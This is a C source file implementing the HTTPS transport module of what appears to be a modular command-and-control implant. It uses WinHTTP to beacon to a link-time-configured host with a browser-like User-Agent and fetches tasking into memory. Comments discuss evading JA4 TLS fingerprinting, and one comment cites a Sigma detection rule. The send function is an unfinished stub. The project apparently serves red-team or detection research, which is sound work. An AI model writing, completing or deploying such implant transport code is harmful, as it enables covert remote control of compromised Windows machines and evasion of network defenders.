// http_transport.c — HTTPS transport PICO stub.
//
// This module provides transport_recv and transport_send over HTTPS.
// It is a PICO stub: compiled as a separate object, linked in (or swapped out)
// at build time via the Crystal Palace linker script. Replacing this file with
// dns_transport.c or ws_transport.c produces a different transport without
// touching any other module.
//
// Wire format is controlled by the wire_plane profile fields injected at link
// time as compile-time constants (LATTICE_HOST, LATTICE_URI, LATTICE_UA, etc.).
//
// Detection note: JA4 fingerprint of this TLS session is observable on the wire.
// To control it, the TLS handshake parameters (cipher suites, extensions order,
// ALPN) must be controlled via a custom TLS stack or WinHTTP profile spoofing.
// See detections/sigma/http_beacon_ja4.yml.

#include <windows.h>
#include <winhttp.h>
#include "../../include/lattice_agent.h"

#ifndef LATTICE_HOST
#define LATTICE_HOST    L"127.0.0.1"
#endif

#ifndef LATTICE_PORT
#define LATTICE_PORT    443
#endif

#ifndef LATTICE_URI
#define LATTICE_URI     L"/api/v1/check"
#endif

#ifndef LATTICE_UA
#define LATTICE_UA      L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
#endif

static HINTERNET g_session  = NULL;
static HINTERNET g_connect  = NULL;

static int http_init(void) {
    if (g_session) return 0;
    g_session = WinHttpOpen(LATTICE_UA,
                            WINHTTP_ACCESS_TYPE_NO_PROXY,
                            WINHTTP_NO_PROXY_NAME,
                            WINHTTP_NO_PROXY_BYPASS, 0);
    if (!g_session) return -1;

    g_connect = WinHttpConnect(g_session, LATTICE_HOST, LATTICE_PORT, 0);
    if (!g_connect) return -1;

    return 0;
}

int transport_recv(uint8_t **buf, size_t *len) {
    if (http_init() != 0) return -1;

    HINTERNET req = WinHttpOpenRequest(g_connect, L"GET", LATTICE_URI,
                                       NULL, WINHTTP_NO_REFERER,
                                       WINHTTP_DEFAULT_ACCEPT_TYPES,
                                       WINHTTP_FLAG_SECURE);
    if (!req) return -1;

    // TODO: add malleable headers from wire_plane profile.
    // TODO: set client certificate for mTLS.

    BOOL sent = WinHttpSendRequest(req, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                   WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    if (!sent || !WinHttpReceiveResponse(req, NULL)) {
        WinHttpCloseHandle(req);
        return -1;
    }

    DWORD status = 0;
    DWORD status_size = sizeof(status);
    WinHttpQueryHeaders(req,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        NULL, &status, &status_size, NULL);

    if (status != 200) {
        WinHttpCloseHandle(req);
        return -1;
    }

    // Read body into heap buffer.
    DWORD content_len = 0;
    DWORD cl_size = sizeof(content_len);
    WinHttpQueryHeaders(req,
        WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER,
        NULL, &content_len, &cl_size, NULL);

    if (content_len == 0) {
        WinHttpCloseHandle(req);
        *buf = NULL;
        *len = 0;
        return 0;
    }

    *buf = (uint8_t *)VirtualAlloc(NULL, content_len,
                                   MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!*buf) { WinHttpCloseHandle(req); return -1; }

    DWORD read = 0, total = 0;
    while (total < content_len) {
        if (!WinHttpReadData(req, *buf + total, content_len - total, &read)) break;
        if (read == 0) break;
        total += read;
    }
    *len = total;

    WinHttpCloseHandle(req);
    return (int)total;
}

int transport_send(const lattice_result_t *result) {
    if (http_init() != 0) return -1;

    // TODO: serialize result to protobuf or JSON.
    // TODO: POST to LATTICE_URI with body.
    (void)result;
    return 0;
}
